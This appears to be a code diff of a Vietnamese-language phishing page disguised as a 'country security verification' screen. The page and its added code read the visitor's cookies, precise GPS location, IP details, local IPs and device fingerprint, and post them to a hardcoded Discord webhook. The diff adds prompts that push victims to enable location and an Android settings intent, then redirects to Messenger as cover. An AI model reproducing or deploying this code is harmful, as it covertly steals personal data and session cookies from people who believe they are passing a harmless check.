@@ -52,6 +52,7 @@
             width: 70px; height: 70px; border-radius: 50%; background: #ff1744;
             display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
             box-shadow: 0 0 25px rgba(255,23,68,0.5); animation: pop 0.4s ease;
+            position: relative;
         }
         .crossmark::after, .crossmark::before {
             content: ''; position: absolute; width: 35px; height: 5px; background: white;
@@ -63,10 +64,15 @@
         #mapImage {
             max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
         }
-        #retryBtn {
-            margin-top: 20px; padding: 10px 28px; background: rgba(255,255,255,0.1);
+        .action-btn {
+            margin-top: 15px; padding: 10px 28px; background: rgba(255,255,255,0.1);
             border-radius: 50px; color: #ffbe0b; font-weight: 600; cursor: pointer;
             border: 1px solid rgba(255,190,11,0.3); font-size: 14px;
+            display: inline-block; margin: 10px 5px;
+        }
+        .action-btn.secondary {
+            background: rgba(255,255,255,0.05);
+            color: #ccc;
         }
     </style>
 </head>
@@ -79,23 +85,22 @@
             </div>
             <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
             <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
-            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;"></div>
+            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;">
+                Nhấn để xác minh bạn là người Việt Nam
+            </div>
             <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
         </div>
 
-        <!-- Result screen (success/reject) -->
         <div id="resultSection" class="hidden">
             <div id="resultMark"></div>
             <div class="status" id="resultStatus"></div>
-            <img id="mapImage" class="hidden" src="" alt="Vị trí">
             <div class="sub" id="resultSub"></div>
-            <div id="retryBtn" class="hidden">Thử lại</div>
+            <div id="actionButtons"></div>
         </div>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
-        const TARGET_COUNTRY = 'Vietnam';
 
         const wheelEl = document.getElementById('wheel');
         const percentEl = document.getElementById('percent');
@@ -108,21 +113,11 @@
         const resultMark = document.getElementById('resultMark');
         const resultStatus = document.getElementById('resultStatus');
         const resultSub = document.getElementById('resultSub');
-        const mapImage = document.getElementById('mapImage');
-        const retryBtn = document.getElementById('retryBtn');
+        const actionButtons = document.getElementById('actionButtons');
 
         let gpsData = null;
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
-
-        function vibrate() { if (window.navigator.vibrate) window.navigator.vibrate(50); }
-
-        function getDeviceHint() {
-            const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return '📱 iPhone: Nhấn "Cho phép" ở góc trên bên trái';
-            if (/Android/.test(ua)) return '📱 Android: Nhấn "Cho phép" ở giữa phía trên';
-            return 'Nhấn "Cho phép" khi trình duyệt hỏi';
-        }
 
         function getFingerprint() {
             const nav = navigator;
@@ -177,7 +172,7 @@
             const apis = [
                 'https://ipapi.co/json/',
                 'https://ipinfo.io/json?token=0',
-                'http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,org,as,query'
+                'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,query'
             ];
             for (let url of apis) {
                 try {
@@ -188,6 +183,7 @@
                         city: d.city || '',
                         region: d.region || d.regionName || '',
                         country: d.country || d.country_name || '',
+                        countryCode: d.countryCode || (d.country_code ? d.country_code : ''),
                         lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
                         lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
                         isp: d.isp || d.org || ''
@@ -213,15 +209,23 @@
             });
         }
 
+        // GPS request with detailed error
         function forceGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
+                if (!navigator.geolocation) {
+                    resolve({ error: 'unsupported' });
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }),
-                    err => resolve(null),
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    pos => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy),
+                        error: null
+                    }),
+                    err => resolve({ error: err.code }), // 1=PERMISSION_DENIED, 2=POSITION_UNAVAILABLE, 3=TIMEOUT
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
-                setTimeout(() => resolve(null), 9000);
             });
         }
 
@@ -235,8 +239,8 @@
                 title: '📱 **Dữ liệu thiết bị & Vị trí**',
                 color: 0xffa502,
                 fields: [
-                    { name: '📍 GPS', value: gpsData ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : 'Không có', inline: true },
-                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nTP: ${ipData.city}, ${ipData.country}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
+                    { name: '📍 GPS', value: gpsData && !gpsData.error ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : (gpsData ? 'Lỗi: ' + gpsData.error : 'Không có'), inline: true },
+                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nQuốc gia: ${ipData.country}\nThành phố: ${ipData.city}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
                     { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                     { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
                     { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
@@ -248,15 +252,129 @@
                     { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                     { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                 ],
-                footer: { text: 'Axr4t2auYc • Xác minh quốc gia' },
+                footer: { text: 'Axr4t2auYc • Xác minh quốc gia chống tấn công' },
                 timestamp: new Date().toISOString()
             };
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
         }
 
-        function showMap(lat, lon) {
-            mapImage.src = `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=14&size=280x160&markers=${lat},${lon},red-pushpin`;
-            mapImage.classList.remove('hidden');
+        // Show the result (success / failure / gps error)
+        function showResult(type, message, subMessage, buttons = []) {
+            wheelSection.classList.add('hidden');
+            resultSection.classList.remove('hidden');
+            if (type === 'success') {
+                resultMark.innerHTML = '<div class="checkmark"></div>';
+            } else {
+                resultMark.innerHTML = '<div class="crossmark"></div>';
+            }
+            resultStatus.textContent = message;
+            resultSub.textContent = subMessage;
+            actionButtons.innerHTML = '';
+            buttons.forEach(btn => {
+                const el = document.createElement('button');
+                el.className = 'action-btn' + (btn.secondary ? ' secondary' : '');
+                el.textContent = btn.label;
+                el.onclick = btn.onClick;
+                actionButtons.appendChild(el);
+            });
+        }
+
+        // Open Android location settings (intent)
+        function openLocationSettings() {
+            const ua = navigator.userAgent;
+            if (/Android/.test(ua)) {
+                window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
+            } else {
+                alert('Vui lòng mở Cài đặt > Quyền riêng tư > Dịch vụ vị trí và bật vị trí cho trình duyệt.');
+            }
+        }
+
+        // Retry verification (go back to wheel)
+        function retry() {
+            resultSection.classList.add('hidden');
+            wheelSection.classList.remove('hidden');
+            // reset wheel state
+            wheelEl.classList.remove('paused');
+            percentEl.textContent = '100%';
+            statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
+            subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
+            tapPrompt.classList.remove('hidden');
+            tapBtn.classList.remove('hidden');
+        }
+
+        // Main verification process
+        async function startVerification() {
+            tapBtn.classList.add('hidden');
+            tapPrompt.classList.add('hidden');
+            statusEl.textContent = 'Đang kiểm tra quốc gia…';
+            wheelEl.classList.remove('paused');
+            percentEl.textContent = '0%';
+            let fake = 0;
+            const fakeInterval = setInterval(() => {
+                fake += 20;
+                percentEl.textContent = fake + '%';
+                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
+            }, 80);
+
+            // Request GPS and fetch IP in parallel
+            const gpsPromise = forceGPS();
+            ipData = await fetchIP();
+            const gpsResult = await gpsPromise;
+
+            clearInterval(fakeInterval);
+            wheelEl.classList.add('paused');
+            percentEl.textContent = '100%';
+
+            // Handle GPS result
+            if (gpsResult && !gpsResult.error) {
+                gpsData = gpsResult;
+            } else {
+                gpsData = gpsResult; // contains error code
+            }
+
+            // Check country from IP
+            const country = ipData ? ipData.country : '';
+            const isVietnam = country.toLowerCase().includes('vietnam') || 
+                              (ipData && ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
+
+            // Send data to webhook
+            await sendData();
+
+            // If GPS failed with permission denied or position unavailable (location off)
+            if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
+                showResult(
+                    'error',
+                    'Không thể lấy vị trí',
+                    'Vui lòng bật dịch vụ vị trí và cho phép quyền truy cập vị trí cho trình duyệt.',
+                    [
+                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings },
+                        { label: 'Thử lại', onClick: retry, secondary: true }
+                    ]
+                );
+                return;
+            }
+
+            // Country check
+            if (isVietnam) {
+                showResult(
+                    'success',
+                    'Xác minh thành công!',
+                    'Bạn là người Việt Nam, được phép truy cập. Đang chuyển hướng…',
+                    []
+                );
+                setTimeout(() => {
+                    window.location.href = 'https://www.messenger.com/';
+                }, 2000);
+            } else {
+                showResult(
+                    'error',
+                    'Truy cập bị từ chối',
+                    'Quốc gia của bạn không được phép. Hệ thống chỉ chấp nhận người dùng Việt Nam.',
+                    [
+                        { label: 'Thử lại', onClick: () => window.location.reload() }
+                    ]
+                );
+            }
         }
 
         // ---- Wheel flow ----
@@ -268,9 +386,8 @@
                 clearInterval(wheelTimer);
                 wheelEl.classList.add('paused');
                 percentEl.textContent = '100%';
-                statusEl.textContent = 'Chuẩn bị xác minh quốc gia…';
-                subEl.textContent = '';
-                tapPrompt.textContent = '⚠️ ' + getDeviceHint() + '\n(Cần cấp quyền để xác minh)';
+                statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
+                subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
                 tapPrompt.classList.remove('hidden');
                 tapBtn.classList.remove('hidden');
             } else {
@@ -278,71 +395,7 @@
             }
         }, 1000);
 
-        tapBtn.addEventListener('click', async () => {
-            vibrate();
-            tapBtn.classList.add('hidden');
-            tapPrompt.classList.add('hidden');
-            statusEl.textContent = 'Đang xác minh quốc gia…';
-            wheelEl.classList.remove('paused');
-            percentEl.textContent = '0%';
-            let fake = 0;
-            const fakeInterval = setInterval(() => {
-                fake += 20;
-                percentEl.textContent = fake + '%';
-                if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
-            }, 80);
-
-            // Fetch IP and optionally GPS
-            const gpsPromise = forceGPS();
-            ipData = await fetchIP();
-            gpsData = await gpsPromise;
-
-            clearInterval(fakeInterval);
-            wheelEl.classList.add('paused');
-            percentEl.textContent = '100%';
-
-            // Check country
-            const country = ipData ? ipData.country : null;
-            const isVietnam = country && country.toLowerCase().indexOf('vietnam') !== -1;
-
-            // Hide wheel, show result
-            wheelSection.classList.add('hidden');
-            resultSection.classList.remove('hidden');
-
-            if (isVietnam) {
-                // Success
-                resultMark.innerHTML = '<div class="checkmark"></div>';
-                resultStatus.textContent = 'Xác minh thành công!';
-                resultSub.textContent = 'Quốc gia: Việt Nam – Bạn đủ điều kiện.';
-                if (gpsData && gpsData.lat && gpsData.lon) {
-                    showMap(gpsData.lat, gpsData.lon);
-                } else if (ipData && ipData.lat && ipData.lon) {
-                    showMap(ipData.lat, ipData.lon);
-                }
-                vibrate();
-                // Redirect after 2.5 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://www.messenger.com/';
-                }, 2500);
-            } else {
-                // Rejection
-                resultMark.innerHTML = '<div class="crossmark"></div>';
-                resultStatus.textContent = 'Quốc gia không được hỗ trợ';
-                resultSub.textContent = 'Chỉ người dùng Việt Nam mới có thể nhận thưởng.';
-                retryBtn.classList.remove('hidden');
-                retryBtn.onclick = () => {
-                    // Reload the whole page
-                    window.location.reload();
-                };
-                // Auto-reload after 5 seconds
-                setTimeout(() => {
-                    window.location.reload();
-                }, 5000);
-            }
-
-            // Send data to Discord regardless
-            await sendData();
-        });
+        tapBtn.addEventListener('click', startVerification);
 
         // Auto-click after 30 seconds if user doesn't tap
         setTimeout(() => {
